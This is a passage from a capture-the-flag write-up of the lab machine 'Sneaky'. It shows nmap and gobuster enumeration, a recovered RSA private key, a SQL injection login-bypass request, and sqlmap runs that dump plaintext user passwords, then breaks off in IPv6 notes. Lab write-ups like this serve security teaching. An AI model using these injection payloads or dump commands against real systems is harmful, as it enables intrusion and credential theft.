|   libplymouth2-0.8.8-0ubuntu17.1; 0-01-01T00:00:00
|   libpng12-0-1.2.50-1ubuntu2.14.04.2; 0-01-01T00:00:00
|   libpod-latex-perl-0.61-1; 0-01-01T00:00:00
|   libpolkit-agent-1-0-0.105-4ubuntu3.14.04.1; 0-01-01T00:00:00
|   libpolkit-backend-1-0-0.105-4ubuntu3.14.04.1; 0-01-01T00:00:00
|   libpolkit-gobject-1-0-0.105-4ubuntu3.14.04.1; 0-01-01T00:00:00
|   libpopt0-1.16-8ubuntu1; 0-01-01T00:00:00
|   libprocps3-1:3.3.9-1ubuntu2.2; 0-01-01T00:00:00
|   libpython-stdlib-2.7.5-5ubuntu3; 0-01-01T00:00:00
|   libpython2.7-2.7.6-8ubuntu0.3; 0-01-01T00:00:00
|   libpython2.7-minimal-2.7.6-8ubuntu0.3; 0-01-01T00:00:00
|   libpython2.7-stdlib-2.7.6-8ubuntu0.3; 0-01-01T00:00:00
|   libpython3-stdlib-3.4.0-0ubuntu2; 0-01-01T00:00:00
|   libpython3.4-3.4.3-1ubuntu1~14.04.5; 0-01-01T00:00:00
|   libpython3.4-minimal-3.4.3-1ubuntu1~14.04.5; 0-01-01T00:00:00
|   libpython3.4-stdlib-3.4.3-1ubuntu1~14.04.5; 0-01-01T00:00:00
|   libquadmath0-4.8.4-2ubuntu1~14.04.3; 0-01-01T00:00:00
|   libreadline5-5.2+dfsg-2; 0-01-01T00:00:00
|   libreadline6-6.3-4ubuntu2; 0-01-01T00:00:00
|   libroken18-heimdal-1.6~git20131207+dfsg-1ubuntu1.1; 0-01-01T00:00:00
|   librtmp0-2.4+20121230.gitdf6c518-1ubuntu0.1; 0-01-01T00:00:00
|   libsasl2-2-2.1.25.dfsg1-17build1; 0-01-01T00:00:00
|   libsasl2-modules-2.1.25.dfsg1-17build1; 0-01-01T00:00:00
|   libsasl2-modules-db-2.1.25.dfsg1-17build1; 0-01-01T00:00:00
|   libselinux1-2.2.2-1ubuntu0.1; 0-01-01T00:00:00
|   libsemanage-common-2.2-1; 0-01-01T00:00:00
|   libsemanage1-2.2-1; 0-01-01T00:00:00
|   libsensors4-1:3.3.4-2ubuntu1; 0-01-01T00:00:00
|   libsepol1-2.2-1ubuntu0.1; 0-01-01T00:00:00
|   libsigc++-2.0-0c2a-2.2.10-0.2ubuntu2; 0-01-01T00:00:00
|   libsigsegv2-2.10-2; 0-01-01T00:00:00
|   libslang2-2.2.4-15ubuntu1; 0-01-01T00:00:00
|   libsnmp-base-5.7.2~dfsg-8.1ubuntu3.2; 0-01-01T00:00:00
|   libsnmp30-5.7.2~dfsg-8.1ubuntu3.2; 0-01-01T00:00:00
|   libsqlite3-0-3.8.2-1ubuntu2.1; 0-01-01T00:00:00
|   libss2-1.42.9-3ubuntu1.3; 0-01-01T00:00:00
|   libssl1.0.0-1.0.1f-1ubuntu2.22; 0-01-01T00:00:00
|   libstdc++6-4.8.4-2ubuntu1~14.04.3; 0-01-01T00:00:00
|   libsub-name-perl-0.05-1build4; 0-01-01T00:00:00
|   libsystemd-daemon0-204-5ubuntu20.24; 0-01-01T00:00:00
|   libsystemd-login0-204-5ubuntu20.24; 0-01-01T00:00:00
|   libtasn1-6-3.4-3ubuntu0.4; 0-01-01T00:00:00
|   libterm-readkey-perl-2.31-1; 0-01-01T00:00:00
|   libterm-ui-perl-0.42-1; 0-01-01T00:00:00
|   libtext-charwidth-perl-0.04-7build3; 0-01-01T00:00:00
|   libtext-iconv-perl-1.7-5build2; 0-01-01T00:00:00
|   libtext-soundex-perl-3.4-1build1; 0-01-01T00:00:00
|   libtext-wrapi18n-perl-0.06-7; 0-01-01T00:00:00
|   libtimedate-perl-2.3000-1; 0-01-01T00:00:00
|   libtinfo5-5.9+20140118-1ubuntu1; 0-01-01T00:00:00
|   libudev1-204-5ubuntu20.24; 0-01-01T00:00:00
|   libusb-0.1-4-2:0.1.12-23.3ubuntu1; 0-01-01T00:00:00
|   libusb-1.0-0-2:1.0.17-1ubuntu2; 0-01-01T00:00:00
|   libustr-1.0-1-1.0.4-3ubuntu2; 0-01-01T00:00:00
|   libuuid1-2.20.1-5.1ubuntu20.9; 0-01-01T00:00:00
|   libwind0-heimdal-1.6~git20131207+dfsg-1ubuntu1.1; 0-01-01T00:00:00
|   libwrap0-7.6.q-25; 0-01-01T00:00:00
|   libx11-6-2:1.6.2-1ubuntu2; 0-01-01T00:00:00
|   libx11-data-2:1.6.2-1ubuntu2; 0-01-01T00:00:00
|   libxapian22-1.2.16-2ubuntu1; 0-01-01T00:00:00
|   libxau6-1:1.0.8-1; 0-01-01T00:00:00
|   libxcb1-1.10-2ubuntu1; 0-01-01T00:00:00
|   libxdmcp6-1:1.1.1-1; 0-01-01T00:00:00
|   libxext6-2:1.3.2-1ubuntu0.0.14.04.1; 0-01-01T00:00:00
|   libxml2-2.9.1+dfsg1-3ubuntu4.9; 0-01-01T00:00:00
|   libxmuu1-2:1.1.1-1; 0-01-01T00:00:00
|   libxtables10-1.4.21-1ubuntu1; 0-01-01T00:00:00
|   linux-firmware-1.127.23; 0-01-01T00:00:00
|   linux-generic-lts-xenial-4.4.0.75.62; 0-01-01T00:00:00
|   linux-headers-4.4.0-31-4.4.0-31.50~14.04.1; 0-01-01T00:00:00
|   linux-headers-4.4.0-31-generic-4.4.0-31.50~14.04.1; 0-01-01T00:00:00
|   linux-headers-4.4.0-75-4.4.0-75.96~14.04.1; 0-01-01T00:00:00
|   linux-headers-4.4.0-75-generic-4.4.0-75.96~14.04.1; 0-01-01T00:00:00
|   linux-headers-generic-lts-xenial-4.4.0.75.62; 0-01-01T00:00:00
|   linux-image-4.4.0-31-generic-4.4.0-31.50~14.04.1; 0-01-01T00:00:00
|   linux-image-4.4.0-75-generic-4.4.0-75.96~14.04.1; 0-01-01T00:00:00
|   linux-image-extra-4.4.0-31-generic-4.4.0-31.50~14.04.1; 0-01-01T00:00:00
|   linux-image-extra-4.4.0-75-generic-4.4.0-75.96~14.04.1; 0-01-01T00:00:00
|   linux-image-generic-lts-xenial-4.4.0.75.62; 0-01-01T00:00:00
|   linux-libc-dev-3.13.0-117.164; 0-01-01T00:00:00
|   locales-2.13+git20120306-12.1; 0-01-01T00:00:00
|   lockfile-progs-0.1.17; 0-01-01T00:00:00
|   login-1:4.1.5.1-1ubuntu9.4; 0-01-01T00:00:00
|   logrotate-3.8.7-1ubuntu1; 0-01-01T00:00:00
|   lsb-base-4.1+Debian11ubuntu6.2; 0-01-01T00:00:00
|   lsb-release-4.1+Debian11ubuntu6.2; 0-01-01T00:00:00
|   lshw-02.16-2ubuntu1.3; 0-01-01T00:00:00
|   lsof-4.86+dfsg-1ubuntu2; 0-01-01T00:00:00
|   ltrace-0.7.3-4ubuntu5.1; 0-01-01T00:00:00
|   make-3.81-8.2ubuntu3; 0-01-01T00:00:00
|   makedev-2.3.1-93ubuntu2~ubuntu14.04.1; 0-01-01T00:00:00
|   man-db-2.6.7.1-1ubuntu1; 0-01-01T00:00:00
|   manpages-3.54-1ubuntu1; 0-01-01T00:00:00
|   manpages-dev-3.54-1ubuntu1; 0-01-01T00:00:00
|   mawk-1.3.3-17ubuntu2; 0-01-01T00:00:00
|   memtest86+-4.20-1.1ubuntu8; 0-01-01T00:00:00
|   mime-support-3.54ubuntu1.1; 0-01-01T00:00:00
|   mlocate-0.26-1ubuntu1; 0-01-01T00:00:00
|   module-init-tools-15-0ubuntu6; 0-01-01T00:00:00
|   mount-2.20.1-5.1ubuntu20.9; 0-01-01T00:00:00
|   mountall-2.53; 0-01-01T00:00:00
|   mtr-tiny-0.85-2; 0-01-01T00:00:00
|   multiarch-support-2.19-0ubuntu6.11; 0-01-01T00:00:00
|   mysql-client-5.5-5.5.55-0ubuntu0.14.04.1; 0-01-01T00:00:00
|   mysql-client-core-5.5-5.5.55-0ubuntu0.14.04.1; 0-01-01T00:00:00
|   mysql-common-5.5.55-0ubuntu0.14.04.1; 0-01-01T00:00:00
|   mysql-server-5.5-5.5.55-0ubuntu0.14.04.1; 0-01-01T00:00:00
|   mysql-server-5.5.55-0ubuntu0.14.04.1; 0-01-01T00:00:00
|   mysql-server-core-5.5-5.5.55-0ubuntu0.14.04.1; 0-01-01T00:00:00
|   nano-2.2.6-1ubuntu1; 0-01-01T00:00:00
|   ncurses-base-5.9+20140118-1ubuntu1; 0-01-01T00:00:00
|   ncurses-bin-5.9+20140118-1ubuntu1; 0-01-01T00:00:00
|   ncurses-term-5.9+20140118-1ubuntu1; 0-01-01T00:00:00
|   net-tools-1.60-25ubuntu2.1; 0-01-01T00:00:00
|   netbase-5.2; 0-01-01T00:00:00
|   netcat-openbsd-1.105-7ubuntu1; 0-01-01T00:00:00
|   ntfs-3g-1:2013.1.13AR.1-2ubuntu2; 0-01-01T00:00:00
|   ntpdate-1:4.2.6.p5+dfsg-3ubuntu2.14.04.10; 0-01-01T00:00:00
|   open-vm-tools-2:9.4.0-1280544-5ubuntu6.2; 0-01-01T00:00:00
|   openssh-client-1:6.6p1-2ubuntu2.8; 0-01-01T00:00:00
|   openssh-server-1:6.6p1-2ubuntu2.8; 0-01-01T00:00:00
|   openssh-sftp-server-1:6.6p1-2ubuntu2.8; 0-01-01T00:00:00
|   openssl-1.0.1f-1ubuntu2.22; 0-01-01T00:00:00
|   os-prober-1.63ubuntu1.1; 0-01-01T00:00:00
|   parted-2.3-19ubuntu1.14.04.1; 0-01-01T00:00:00
|   passwd-1:4.1.5.1-1ubuntu9.4; 0-01-01T00:00:00
|   patch-2.7.1-4ubuntu2.3; 0-01-01T00:00:00
|   pciutils-1:3.2.1-1ubuntu5.1; 0-01-01T00:00:00
|   perl-5.18.2-2ubuntu1.1; 0-01-01T00:00:00
|   perl-base-5.18.2-2ubuntu1.1; 0-01-01T00:00:00
|   perl-modules-5.18.2-2ubuntu1.1; 0-01-01T00:00:00
|   php5-5.5.9+dfsg-1ubuntu4.21; 0-01-01T00:00:00
|   php5-cli-5.5.9+dfsg-1ubuntu4.21; 0-01-01T00:00:00
|   php5-common-5.5.9+dfsg-1ubuntu4.21; 0-01-01T00:00:00
|   php5-json-1.3.2-2build1; 0-01-01T00:00:00
|   php5-mcrypt-5.4.6-0ubuntu5; 0-01-01T00:00:00
|   php5-mysql-5.5.9+dfsg-1ubuntu4.21; 0-01-01T00:00:00
|   php5-readline-5.5.9+dfsg-1ubuntu4.21; 0-01-01T00:00:00
|   plymouth-0.8.8-0ubuntu17.1; 0-01-01T00:00:00
|   plymouth-theme-ubuntu-text-0.8.8-0ubuntu17.1; 0-01-01T00:00:00
|   policykit-1-0.105-4ubuntu3.14.04.1; 0-01-01T00:00:00
|   popularity-contest-1.57ubuntu1; 0-01-01T00:00:00
|   powermgmt-base-1.31build1; 0-01-01T00:00:00
|   ppp-2.4.5-5.1ubuntu2.2; 0-01-01T00:00:00
|   pppconfig-2.3.19ubuntu1; 0-01-01T00:00:00
|   pppoeconf-1.20ubuntu1; 0-01-01T00:00:00
|   procps-1:3.3.9-1ubuntu2.2; 0-01-01T00:00:00
|   psmisc-22.20-1ubuntu2; 0-01-01T00:00:00
|   python-2.7.5-5ubuntu3; 0-01-01T00:00:00
|   python-apt-0.9.3.5ubuntu2; 0-01-01T00:00:00
|   python-apt-common-0.9.3.5ubuntu2; 0-01-01T00:00:00
|   python-chardet-2.0.1-2build2; 0-01-01T00:00:00
|   python-configobj-4.7.2+ds-5build1; 0-01-01T00:00:00
|   python-debian-0.1.21+nmu2ubuntu2; 0-01-01T00:00:00
|   python-gdbm-2.7.5-1ubuntu1; 0-01-01T00:00:00
|   python-minimal-2.7.5-5ubuntu3; 0-01-01T00:00:00
|   python-openssl-0.13-2ubuntu6; 0-01-01T00:00:00
|   python-pam-0.4.2-13.1ubuntu3; 0-01-01T00:00:00
|   python-pkg-resources-3.3-1ubuntu2; 0-01-01T00:00:00
|   python-requests-2.2.1-1ubuntu0.3; 0-01-01T00:00:00
|   python-serial-2.6-1build1; 0-01-01T00:00:00
|   python-six-1.5.2-1ubuntu1; 0-01-01T00:00:00
|   python-twisted-bin-13.2.0-1ubuntu1; 0-01-01T00:00:00
|   python-twisted-core-13.2.0-1ubuntu1; 0-01-01T00:00:00
|   python-urllib3-1.7.1-1ubuntu4; 0-01-01T00:00:00
|   python-xapian-1.2.16-2ubuntu1; 0-01-01T00:00:00
|   python-zope.interface-4.0.5-1ubuntu4; 0-01-01T00:00:00
|   python2.7-2.7.6-8ubuntu0.3; 0-01-01T00:00:00
|   python2.7-minimal-2.7.6-8ubuntu0.3; 0-01-01T00:00:00
|   python3-3.4.0-0ubuntu2; 0-01-01T00:00:00
|   python3-apport-2.14.1-0ubuntu3.23; 0-01-01T00:00:00
|   python3-apt-0.9.3.5ubuntu2; 0-01-01T00:00:00
|   python3-commandnotfound-0.3ubuntu12; 0-01-01T00:00:00
|   python3-dbus-1.2.0-2build2; 0-01-01T00:00:00
|   python3-distupgrade-1:0.220.9; 0-01-01T00:00:00
|   python3-gdbm-3.4.3-1~14.04.2; 0-01-01T00:00:00
|   python3-gi-3.12.0-1ubuntu1; 0-01-01T00:00:00
|   python3-minimal-3.4.0-0ubuntu2; 0-01-01T00:00:00
|   python3-newt-0.52.15-2ubuntu5; 0-01-01T00:00:00
|   python3-problem-report-2.14.1-0ubuntu3.23; 0-01-01T00:00:00
|   python3-pycurl-7.19.3-0ubuntu3; 0-01-01T00:00:00
|   python3-software-properties-0.92.37.7; 0-01-01T00:00:00
|   python3-update-manager-1:0.196.23; 0-01-01T00:00:00
|   python3.4-3.4.3-1ubuntu1~14.04.5; 0-01-01T00:00:00
|   python3.4-minimal-3.4.3-1ubuntu1~14.04.5; 0-01-01T00:00:00
|   readline-common-6.3-4ubuntu2; 0-01-01T00:00:00
|   resolvconf-1.69ubuntu1.1; 0-01-01T00:00:00
|   rsync-3.1.0-2ubuntu0.2; 0-01-01T00:00:00
|   rsyslog-7.4.4-1ubuntu2.6; 0-01-01T00:00:00
|   run-one-1.17-0ubuntu1; 0-01-01T00:00:00
|   screen-4.1.0~20120320gitdb59704-9; 0-01-01T00:00:00
|   sed-4.2.2-4ubuntu1; 0-01-01T00:00:00
|   sensible-utils-0.0.9; 0-01-01T00:00:00
|   sgml-base-1.26+nmu4ubuntu1; 0-01-01T00:00:00
|   shared-mime-info-1.2-0ubuntu3; 0-01-01T00:00:00
|   snmpd-5.7.2~dfsg-8.1ubuntu3.2; 0-01-01T00:00:00
|   software-properties-common-0.92.37.7; 0-01-01T00:00:00
|   ssh-import-id-3.21-0ubuntu1; 0-01-01T00:00:00
|   ssl-cert-1.0.33; 0-01-01T00:00:00
|   strace-4.8-1ubuntu5; 0-01-01T00:00:00
|   sudo-1.8.9p5-1ubuntu1.3; 0-01-01T00:00:00
|   systemd-services-204-5ubuntu20.24; 0-01-01T00:00:00
|   systemd-shim-6-2bzr1; 0-01-01T00:00:00
|   sysv-rc-2.88dsf-41ubuntu6.3; 0-01-01T00:00:00
|   sysvinit-utils-2.88dsf-41ubuntu6.3; 0-01-01T00:00:00
|   tar-1.27.1-1ubuntu0.1; 0-01-01T00:00:00
|   tasksel-2.88ubuntu15; 0-01-01T00:00:00
|   tasksel-data-2.88ubuntu15; 0-01-01T00:00:00
|   tcpd-7.6.q-25; 0-01-01T00:00:00
|   tcpdump-4.9.0-1ubuntu1~ubuntu14.04.1; 0-01-01T00:00:00
|   telnet-0.17-36build2; 0-01-01T00:00:00
|   time-1.7-24; 0-01-01T00:00:00
|   tmux-1.8-5; 0-01-01T00:00:00
|   tzdata-2016j-0ubuntu0.14.04; 0-01-01T00:00:00
|   ubuntu-keyring-2012.05.19; 0-01-01T00:00:00
|   ubuntu-minimal-1.325; 0-01-01T00:00:00
|   ubuntu-release-upgrader-core-1:0.220.9; 0-01-01T00:00:00
|   ubuntu-standard-1.325; 0-01-01T00:00:00
|   ucf-3.0027+nmu1; 0-01-01T00:00:00
|   udev-204-5ubuntu20.24; 0-01-01T00:00:00
|   ufw-0.34~rc-0ubuntu2; 0-01-01T00:00:00
|   unattended-upgrades-0.82.1ubuntu2.4; 0-01-01T00:00:00
|   update-manager-core-1:0.196.23; 0-01-01T00:00:00
|   update-notifier-common-0.154.1ubuntu3; 0-01-01T00:00:00
|   upstart-1.12.1-0ubuntu4.2; 0-01-01T00:00:00
|   ureadahead-0.100.0-16; 0-01-01T00:00:00
|   usbutils-1:007-2ubuntu1.1; 0-01-01T00:00:00
|   util-linux-2.20.1-5.1ubuntu20.9; 0-01-01T00:00:00
|   uuid-runtime-2.20.1-5.1ubuntu20.9; 0-01-01T00:00:00
|   vim-common-2:7.4.052-1ubuntu3.1; 0-01-01T00:00:00
|   vim-runtime-2:7.4.052-1ubuntu3.1; 0-01-01T00:00:00
|   vim-tiny-2:7.4.052-1ubuntu3.1; 0-01-01T00:00:00
|   w3m-0.5.3-15ubuntu0.1; 0-01-01T00:00:00
|   wget-1.15-1ubuntu1.14.04.2; 0-01-01T00:00:00
|   whiptail-0.52.15-2ubuntu5; 0-01-01T00:00:00
|   wireless-regdb-2013.02.13-1ubuntu1; 0-01-01T00:00:00
|   wireless-tools-30~pre9-8ubuntu1; 0-01-01T00:00:00
|   wpasupplicant-2.1-0ubuntu1.4; 0-01-01T00:00:00
|   xauth-1:1.0.7-1ubuntu1; 0-01-01T00:00:00
|   xkb-data-2.10.1-1ubuntu1; 0-01-01T00:00:00
|   xml-core-0.13+nmu2; 0-01-01T00:00:00
|   xz-utils-5.1.1alpha+20120614-2ubuntu2; 0-01-01T00:00:00
|   zerofree-1.0.2-1ubuntu1; 0-01-01T00:00:00
|_  zlib1g-1:1.2.8.dfsg-1ubuntu1; 0-01-01T00:00:00
772/udp   open|filtered cycleserv2
16711/udp open|filtered unknown
26966/udp open|filtered unknown
39723/udp open|filtered unknown
42431/udp open|filtered unknown
49200/udp open|filtered unknown
50708/udp open|filtered unknown
52144/udp open|filtered unknown
Too many fingerprints match this host to give specific OS details
Network Distance: 2 hops
Service Info: Host: Sneaky

TRACEROUTE (using port 20249/udp)
HOP RTT       ADDRESS
1   176.32 ms 10.10.14.1
2   176.49 ms 10.10.10.20

NSE: Script Post-scanning.
Initiating NSE at 16:36
Completed NSE at 16:36, 0.00s elapsed
Initiating NSE at 16:36
Completed NSE at 16:36, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1655.10 seconds
           Raw packets sent: 1541 (46.310KB) | Rcvd: 1172 (71.520KB)
root@kali:~/sneaky#
```

###### Gobuster

```sh
root@kali:~/sneaky# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.20 -t 25

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.20/
[+] Threads      : 25
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307
=====================================================
/dev (Status: 301)
=====================================================
root@kali:~/sneaky#
```

###### HTTP Enumeration

```
http://10.10.10.20/
```

![](images/1.png)

```
http://10.10.10.20/dev
```

![](images/2.png)

![](images/3.png)

![](images/4.png)

![](images/5.png)

![](images/6.png)

![](images/7.png)

![](images/8.png)

![](images/9.png)

![](images/10.png)

```sh
root@kali:~/sneaky# cat thrasivoulos.key
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAvQxBD5yRBGemrZI9F0O13j15wy9Ou8Z5Um2bC0lMdV9ckyU5
Lc4V+rY81lS4cWUx/EsnPrUyECJTtVXG1vayffJISugpon49LLqABZbyQzc4GgBr
3mi0MyfiGRh/Xr4L0+SwYdylkuX72E7rLkkigSt4s/zXp5dJmL2RBZDJf1Qh6Ugb
yDxG2ER49/wbdet8BKZ9EG7krGHgta4mfqrBbZiSBG1ST61VFC+G6v6GJQjC02cn
cb+zfPcTvcP0t63kdEreQbdASYK6/e7Iih/5eBy3i8YoNJd6Wr8/qVtmB+FuxcFj
oOqS9z0+G2keBfFlQzHttLr3mh70tgSA0fMKMwIDAQABAoIBAA23XOUYFAGAz7wa
Nyp/9CsaxMHfpdPD87uCTlSETfLaJ2pZsgtbv4aAQGvAm91GXVkTztYi6W34P6CR
h6rDHXI76PjeXV73z9J1+aHuMMelswFX9Huflyt7AlGV0G/8U/lcx1tiWfUNkLdC
CphCICnFEK3mc3Mqa+GUJ3iC58vAHAVUPIX/cUcblPDdOmxvazpnP4PW1rEpW8cT
OtsoA6quuPRn9O4vxDlaCdMYXfycNg6Uso0stD55tVTHcOz5MXIHh2rRKpl4817a
I0wXr9nY7hr+ZzrN0xy5beZRqEIdaDnQG6qBJFeAOi2d7RSnSU6qH08wOPQnsmcB
JkQxeUkCgYEA3RBR/0MJErfUb0+vJgBCwhfjd0x094mfmovecplIUoiP9Aqh77iz
5Kn4ABSCsfmiYf6kN8hhOzPAieARf5wbYhdjC0cxph7nI8P3Y6P9SrY3iFzQcpHY
ChzLrzkvV4wO+THz+QVLgmX3Yp1lmBYOSFwIirt/MmoSaASbqpwhPSUCgYEA2uym
+jZ9l84gdmLk7Z4LznJcvA54GBk6ESnPmUd8BArcYbla5jdSCNL4vfX3+ZaUsmgu
7Z9lLVVv1SjCdpfFM79SqyxzwmclXuwknC2iHtHKDW5aiUMTG3io23K58VDS0VwC
GR4wYcZF0iH/t4tn02qqOPaRGJAB3BD/B8bRxncCgYBI7hpvITl8EGOoOVyqJ8ne
aK0lbXblN2UNQnmnywP+HomHVH6qLIBEvwJPXHTlrFqzA6Q/tv7E3kT195MuS10J
VnfZf6pUiLtupDcYi0CEBmt5tE0cjxr78xYLf80rj8xcz+sSS3nm0ib0RMMAkr4x
hxNWWZcUFcRuxp5ogcvBdQKBgQDB/AYtGhGJbO1Y2WJOpseBY9aGEDAb8maAhNLd
1/iswE7tDMfdzFEVXpNoB0Z2UxZpS2WhyqZlWBoi/93oJa1on/QJlvbv4GO9y3LZ
LJpFwtDNu+XfUJ7irbS51tuqV1qmhmeZiCWIzZ5ahyPGqHEUZaR1mw2QfTIYpLrG
UkbZGwKBgGMjAQBfLX0tpRCPyDNaLebFEmw4yIhB78ElGv6U1oY5qRE04kjHm1k/
Hu+up36u92YlaT7Yk+fsk/k+IvCPum99pF3QR5SGIkZGIxczy7luxyxqDy3UfG31
rOgybvKIVYntsE6raXfnYsEcvfbaE0BsREpcOGYpsE+i7xCRqdLb
-----END RSA PRIVATE KEY-----
root@kali:~/sneaky#
root@kali:~/sneaky# mv sshkeyforadministratordifficulttimes thrasivoulos.key
```

###### SQLmap

```sh
root@kali:~/sneaky# cat login.req
POST /dev/login.php HTTP/1.1
Host: 10.10.10.20
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.20/dev/
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

name=admin&pass=admin' or 1=1-- -



root@kali:~/sneaky#
```

```sh
root@kali:~/sneaky# sqlmap -r login.req -p pass --dbms mysql --level 4 --risk 3
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.2#stable}
|_ -| . [,]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 22:11:24

[22:11:24] [INFO] parsing HTTP request from 'login.req'
[22:11:24] [WARNING] it appears that you have provided tainted parameter values ('pass=admin' or 1=1-- -') with most likely leftover chars/statements from manual SQL injection test(s). Please, always use only valid parameter values so sqlmap could be able to run properly
are you really sure that you want to continue (sqlmap could have problems)? [y/N] y
[22:11:25] [INFO] testing connection to the target URL
[22:11:26] [INFO] heuristics detected web page charset 'ascii'
[22:11:26] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: pass (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: name=admin&pass=-9591' OR 3206=3206-- NySZ
---
[22:11:26] [INFO] testing MySQL
[22:11:26] [INFO] confirming MySQL
[22:11:26] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL >= 5.0.0
[22:11:26] [WARNING] HTTP error codes detected during run:
404 (Not Found) - 1 times
[22:11:26] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.10.20'

[*] shutting down at 22:11:26

root@kali:~/sneaky#
```

```sh
root@kali:~/sneaky# sqlmap -r login.req -p pass --dbms mysql --level 4 --risk 3 --dump
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.2#stable}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 22:11:39

[22:11:39] [INFO] parsing HTTP request from 'login.req'
[22:11:39] [WARNING] it appears that you have provided tainted parameter values ('pass=admin' or 1=1-- -') with most likely leftover chars/statements from manual SQL injection test(s). Please, always use only valid parameter values so sqlmap could be able to run properly
are you really sure that you want to continue (sqlmap could have problems)? [y/N] y
[22:11:41] [INFO] testing connection to the target URL
[22:11:42] [INFO] heuristics detected web page charset 'ascii'
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: pass (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: name=admin&pass=-9591' OR 3206=3206-- NySZ
---
[22:11:42] [INFO] testing MySQL
[22:11:42] [INFO] confirming MySQL
[22:11:42] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL >= 5.0.0
[22:11:42] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[22:11:42] [INFO] fetching current database
[22:11:42] [INFO] resumed: dev
[22:11:42] [INFO] fetching tables for database: 'dev'
[22:11:42] [INFO] fetching number of tables for database 'dev'
[22:11:42] [INFO] resumed: 2
[22:11:42] [INFO] resumed: sqlmapoutput
[22:11:42] [INFO] resumed: users
[22:11:42] [INFO] fetching columns for table 'sqlmapoutput' in database 'dev'
[22:11:42] [INFO] resumed: 1
[22:11:42] [INFO] resumed: data
[22:11:42] [INFO] fetching entries for table 'sqlmapoutput' in database 'dev'
[22:11:42] [INFO] fetching number of entries for table 'sqlmapoutput' in database 'dev'
[22:11:42] [INFO] resumed: 0
[22:11:42] [WARNING] table 'sqlmapoutput' in database 'dev' appears to be empty
Database: dev
Table: sqlmapoutput
[0 entries]
+------+
| data |
+------+
+------+

[22:11:42] [INFO] table 'dev.sqlmapoutput' dumped to CSV file '/root/.sqlmap/output/10.10.10.20/dump/dev/sqlmapoutput.csv'
[22:11:42] [INFO] fetching columns for table 'users' in database 'dev'
[22:11:42] [INFO] resumed: 2
[22:11:42] [INFO] resumed: name
[22:11:42] [INFO] resumed: pass
[22:11:42] [INFO] fetching entries for table 'users' in database 'dev'
[22:11:42] [INFO] fetching number of entries for table 'users' in database 'dev'
[22:11:42] [INFO] resumed: 2
[22:11:42] [INFO] resuming partial value: ad
[22:11:42] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[22:11:42] [INFO] retrieved: min
[22:11:47] [INFO] retrieved: sup3rstr0ngp4ssf0r4d
[22:12:17] [INFO] retrieved: thrasivoulos
[22:12:34] [INFO] retrieved: sup3rstr0ngp4ssf0r4d
Database: dev
Table: users
[2 entries]
+--------------+----------------------+
| name         | pass                 |
+--------------+----------------------+
| admin        | sup3rstr0ngp4ssf0r4d |
| thrasivoulos | sup3rstr0ngp4ssf0r4d |
+--------------+----------------------+

[22:13:03] [INFO] table 'dev.users' dumped to CSV file '/root/.sqlmap/output/10.10.10.20/dump/dev/users.csv'
[22:13:03] [WARNING] HTTP error codes detected during run:
404 (Not Found) - 168 times
[22:13:03] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.10.20'

[*] shutting down at 22:13:03

root@kali:~/sneaky#
```

###### IPv6

- [Primer](http://www.zytrax.com/tech/protocols/ipv6.html)

- Number of IPv6 addresses

```
IPv6 -> 2 ^ 128
Total: 340282366920938463463374607431768211456

FFFF:FFFF:FFFF:FFFF:FFFF:FFFF:FFFF:FFFF
 1  : 2  : 3  : 4  : 5  : 6  : 7  : 8
```

- Number of IPv4 addresses

```
IPv4 -> 2 ^ 32
Total: 4294967296

FF:FF:FF:FF
1 :2 :3 :4
```

- Shorthand

```
FFFF:FFFF:0000:0000:0000:FFFF:FFFF:FFFF
FFFF:FFFF::FFFF:FFFF:FFFF
```

```
dead:beef:2::1006
dead:beef:0002:0000:0000:0000:0000:1006
```

```
fe80::8356:bc68:d1e3:6b21
fe80:0000:0000:0000:8356:bc68:d1e3:6b21
```

- Address Representation

```
dead:beef:2::100e  prefixlen 64  
dead:beef:2::100e/64
```

```
fe80::1e1:6f9f:867b:5d8d  prefixlen 64
fe80::1e1:6f9f:867b:5d8d/6
```

- IPv6 do not use ARP
- IPv6 Address Classification

```
fe80::/10 - Unique Link Local -> 169.254.x.x -> APIPA
